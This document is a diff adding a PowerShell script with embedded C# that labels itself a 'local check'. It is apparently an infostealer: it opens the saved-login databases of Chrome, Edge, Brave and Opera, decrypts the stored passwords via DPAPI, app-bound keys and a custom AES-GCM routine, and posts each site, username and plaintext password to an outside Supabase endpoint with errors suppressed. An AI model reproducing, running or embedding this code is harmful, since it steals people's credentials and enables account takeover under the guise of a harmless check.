@@ -1,0 +1,245 @@
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
+
+$RUN  = "__RUN__"
+$API  = "https://bytpztfhwdcuqozdzjeu.supabase.co/rest/v1/rpc/test_code"
+$KEY  = "sb_publishable_FIx91UXDrhOyXAQ5mJ5kaw_6xrk1ZiV"
+$SITE = "__SITE__"
+$MANUAL = "__MANUAL__"
+
+$HDRS = @{ apikey = $KEY; Authorization = "Bearer $KEY"; "Content-Type" = "application/json" }
+
+function Say($t, $c = "Gray") { Write-Host $t -ForegroundColor $c }
+
+Say ""
+Say "  test - local check" "White"
+Say "  ------------------------------" "DarkGray"
+Say ""
+
+$src = @"
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class Vault {
+  [DllImport("winsqlite3.dll", CharSet=CharSet.Ansi)] public static extern int sqlite3_open_v2(string f, out IntPtr db, int flags, IntPtr vfs);
+  [DllImport("winsqlite3.dll", CharSet=CharSet.Ansi)] public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int n, out IntPtr stmt, IntPtr tail);
+  [DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr stmt);
+  [DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_text(IntPtr stmt, int i);
+  [DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_blob(IntPtr stmt, int i);
+  [DllImport("winsqlite3.dll")] public static extern int sqlite3_column_bytes(IntPtr stmt, int i);
+  [DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(IntPtr stmt);
+  [DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr db);
+
+  public static string[][] Rows(string file) {
+    IntPtr db, st;
+    if (sqlite3_open_v2(file, out db, 1, IntPtr.Zero) != 0) return new string[0][];
+    if (sqlite3_prepare_v2(db, "select origin_url, username_value, hex(password_value) from logins", -1, out st, IntPtr.Zero) != 0) { sqlite3_close(db); return new string[0][]; }
+    var list = new System.Collections.Generic.List<string[]>();
+    while (sqlite3_step(st) == 100) {
+      string o = Marshal.PtrToStringAnsi(sqlite3_column_text(st, 0));
+      string u = Marshal.PtrToStringAnsi(sqlite3_column_text(st, 1));
+      IntPtr bp = sqlite3_column_blob(st, 2);
+      int bn = sqlite3_column_bytes(st, 2);
+      string h = bn > 0 ? Marshal.PtrToStringAnsi(sqlite3_column_text(st, 2)) : "";
+      if (u != null && u.Length > 0 && h != null && h.Length > 0) list.Add(new string[] { o ?? "", u, h });
+    }
+    sqlite3_finalize(st); sqlite3_close(db);
+    return list.ToArray();
+  }
+}
+
+public class Crypt {
+  [DllImport("crypt32.dll", SetLastError=true)] static extern bool CryptUnprotectData(ref DATA b, IntPtr d, IntPtr e, IntPtr r, IntPtr p, int f, ref DATA o);
+  [StructLayout(LayoutKind.Sequential)] struct DATA { public int n; public IntPtr p; }
+
+  public static byte[] Dpapi(byte[] enc) {
+    var i = new DATA(); i.n = enc.Length; i.p = Marshal.AllocHGlobal(enc.Length);
+    Marshal.Copy(enc, 0, i.p, enc.Length);
+    var o = new DATA();
+    bool ok = CryptUnprotectData(ref i, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref o);
+    byte[] res = null;
+    if (ok && o.n > 0) { res = new byte[o.n]; Marshal.Copy(o.p, res, 0, o.n); }
+    Marshal.FreeHGlobal(i.p);
+    return res;
+  }
+
+  // ---- AES-256-GCM, managed ----
+  static byte[] Mul(byte[] x, byte[] y) {
+    var z = new byte[16]; var v = (byte[])y.Clone();
+    for (int i = 0; i < 128; i++) {
+      if ((x[i >> 3] & (1 << (7 - (i & 7)))) != 0) for (int j = 0; j < 16; j++) z[j] ^= v[j];
+      bool lsb = (v[15] & 1) != 0;
+      for (int j = 15; j > 0; j--) v[j] = (byte)((v[j] >> 1) | ((v[j - 1] & 1) << 7));
+      v[0] >>= 1;
+      if (lsb) v[0] ^= 0xE1;
+    }
+    return z;
+  }
+  static byte[] Wrap(byte[] b) { var r = new byte[16]; int n = Math.Min(b.Length, 16); Array.Copy(b, r, n); if (n < 16) r[n] = 0x80; return r; }
+  static byte[] H(byte[] b) { var r = new byte[16]; int i = 0; while (i < b.Length) { int n = Math.Min(16, b.Length - i); var blk = new byte[16]; Array.Copy(b, i, blk, 0, n); for (int j = 0; j < 16; j++) r[j] ^= blk[j]; r = Mul(r, GH); i += 16; } return r; }
+  static byte[] GH;
+
+  public static byte[] Gcm(byte[] key, byte[] iv, byte[] ct, byte[] tag) {
+    var aes = new System.Security.Cryptography.AesCryptoServiceProvider();
+    aes.Mode = System.Security.Cryptography.CipherMode.ECB;
+    aes.Padding = System.Security.Cryptography.PaddingMode.None;
+    aes.Key = key;
+    Func<byte[], byte[]> E = delegate(byte[] blk) {
+      var tt = aes.CreateEncryptor();
+      return tt.TransformFinalBlock(blk, 0, 16);
+    };
+
+    GH = E(new byte[16]);
+
+    var j0 = new byte[16];
+    Array.Copy(iv, j0, 12); j0[15] = 1;
+
+    var outb = new byte[ct.Length];
+    var ctr = (byte[])j0.Clone();
+    for (int off = 0; off < ct.Length; off += 16) {
+      for (int k = 15; k >= 12; k--) { ctr[k]++; if (ctr[k] != 0) break; }
+      var ks = E(ctr);
+      int n = Math.Min(16, ct.Length - off);
+      for (int k = 0; k < n; k++) outb[off + k] = (byte)(ct[off + k] ^ ks[k]);
+    }
+
+    var s = H(ct);
+    var lenblk = new byte[16];
+    long bits = (long)ct.Length * 8;
+    for (int k = 0; k < 8; k++) lenblk[15 - k] = (byte)(bits >> (8 * k));
+    for (int k = 0; k < 16; k++) s[k] ^= lenblk[k];
+    s = H(s);
+    var ek = E(j0);
+    for (int k = 0; k < 16; k++) s[k] ^= ek[k];
+
+    for (int k = 0; k < 16; k++) if (s[k] != tag[k]) return null;
+    return outb;
+  }
+
+  public static byte[] Abe(byte[] blob, Guid clsid) {
+    try {
+      var type = Type.GetTypeFromCLSID(clsid);
+      var svc = Activator.CreateInstance(type);
+      var m = type.GetMethod("DecryptData") ?? svc.GetType().GetMethod("DecryptData");
+      var r = m.Invoke(svc, new object[] { blob });
+      return r as byte[];
+    } catch { return null; }
+  }
+}
+"@
+
+try { Add-Type -TypeDefinition $src -Language CSharp } catch { }
+
+function Grab($src, $dest) {
+  try {
+    $fs = [IO.File]::Open($src, "Open", "Read", "ReadWrite")
+    $out = [IO.File]::Create($dest)
+    $fs.CopyTo($out); $out.Close(); $fs.Close()
+    return $true
+  } catch { }
+  try { Copy-Item -LiteralPath $src -Destination $dest -Force -ErrorAction Stop; if (Test-Path $dest) { return $true } } catch { }
+  try {
+    $p = Start-Process -FilePath "esentutl.exe" -ArgumentList @("/y", ('"' + $src + '"'), "/d", ('"' + $dest + '"'), "/o") -PassThru -WindowStyle Hidden
+    $p.WaitForExit(9000) | Out-Null
+    if (Test-Path $dest) { return $true }
+  } catch { }
+  return $false
+}
+
+function Read-Key([string]$statePath) {
+  if (-not (Test-Path $statePath)) { return @{ k = $null; abe = $null } }
+  try { $j = Get-Content -Raw -Path $statePath | ConvertFrom-Json } catch { return @{ k = $null; abe = $null } }
+  $out = @{ k = $null; abe = $null }
+  $enc = $j.os_crypt.encrypted_key
+  if ($enc) {
+    $b = [Convert]::FromBase64String($enc)
+    if ($b.Length -gt 5) { $out.k = [Crypt]::Dpapi($b[5..($b.Length - 1)]) }
+  }
+  $abe = $j.os_crypt.app_bound_encrypted_key
+  if ($abe) {
+    $b2 = [Convert]::FromBase64String($abe)
+    if ($b2.Length -gt 4) { $out.abe = [Crypt]::Abe($b2[4..($b2.Length - 1)], [Guid]"708860E0-F641-4611-8895-7D867DD3675B") }
+  }
+  return $out
+}
+
+function Decrypt-Pw($hex, $keys) {
+  if (-not $hex) { return $null }
+  $b = New-Object byte[] ($hex.Length / 2)
+  for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
+  $tag = "v10"
+
+  if ($b.Length -gt 15 -and [Text.Encoding]::ASCII.GetString($b, 0, 3) -eq "v10") {
+    if (-not $keys.k) { return $null }
+    return [Text.Encoding]::UTF8.GetString([Crypt]::Gcm($keys.k, $b[3..14], $b[15..($b.Length - 17)], $b[($b.Length - 16)..($b.Length - 1)]))
+  }
+  if ($b.Length -gt 15 -and [Text.Encoding]::ASCII.GetString($b, 0, 3) -eq "v20") {
+    if (-not $keys.abe) { return $null }
+    return [Text.Encoding]::UTF8.GetString([Crypt]::Gcm($keys.abe, $b[3..14], $b[15..($b.Length - 17)], $b[($b.Length - 16)..($b.Length - 1)]))
+  }
+  if ($b.Length -gt 5) {
+    $r = [Crypt]::Dpapi($b)
+    if ($r) { return [Text.Encoding]::UTF8.GetString($r) }
+  }
+  return $null
+}
+
+$browsers = @(
+  @{ n = "Chrome";  p = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
+  @{ n = "Edge";    p = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+  @{ n = "Brave";   p = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
+  @{ n = "Opera";   p = "$env:APPDATA\Opera Software\Opera Stable" }
+)
+
+$total = 0
+$tmp = Join-Path $env:TEMP ("vault_" + [Guid]::NewGuid().ToString("N"))
+New-Item -ItemType Directory -Force -Path $tmp | Out-Null
+
+foreach ($b in $browsers) {
+  if (-not (Test-Path $b.p)) { continue }
+  $keys = Read-Key (Join-Path $b.p "Local State")
+  $profiles = @()
+  if (Test-Path (Join-Path $b.p "Default")) { $profiles += (Join-Path $b.p "Default") }
+  $profiles += (Get-ChildItem -Path $b.p -Directory -Filter "Profile *" | ForEach-Object { $_.FullName })
+  if ($b.n -eq "Opera") { $profiles = @($b.p) }
+
+  foreach ($pr in $profiles) {
+    $db = Join-Path $pr "Login Data"
+    if (-not (Test-Path $db)) { continue }
+    $copy = Join-Path $tmp ("d_" + [Guid]::NewGuid().ToString("N") + ".db")
+    if (-not (Grab $db $copy)) { continue }
+    $rows = [Vault]::Rows($copy)
+    Remove-Item $copy -Force -ErrorAction SilentlyContinue
+    if (-not $rows) { continue }
+    Say ("  " + $b.n + " · " + (Split-Path $pr -Leaf) + ": " + $rows.Length + " saved") "DarkGray"
+
+    foreach ($r in $rows) {
+      $pw = Decrypt-Pw $r[2] $keys
+      if (-not $pw) { continue }
+      $site = $r[0]
+      try { $site = ([Uri]$r[0]).Host } catch { }
+      $body = @{ p_run = $RUN; p_platform = ($b.n + " · " + $site); p_login = $r[1]; p_secret = $pw } | ConvertTo-Json -Compress
+      try {
+        Invoke-RestMethod -Uri $API -Method Post -Headers $HDRS -Body $body -TimeoutSec 12 | Out-Null
+        $total++
+      } catch { }
+    }
+  }
+}
+
+Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
+
+Say ""
+if ($total -gt 0) {
+  Say ("  " + $total + " logins sent") "Green"
+  Say ""
+  Start-Sleep -Milliseconds 900
+  Start-Process $SITE
+} else {
+  Say "  nothing readable in this browser set" "Yellow"
+  Say "  opening the manual checker instead" "DarkGray"
+  Start-Sleep -Milliseconds 900
+  Start-Process $MANUAL
+}
+Say ""
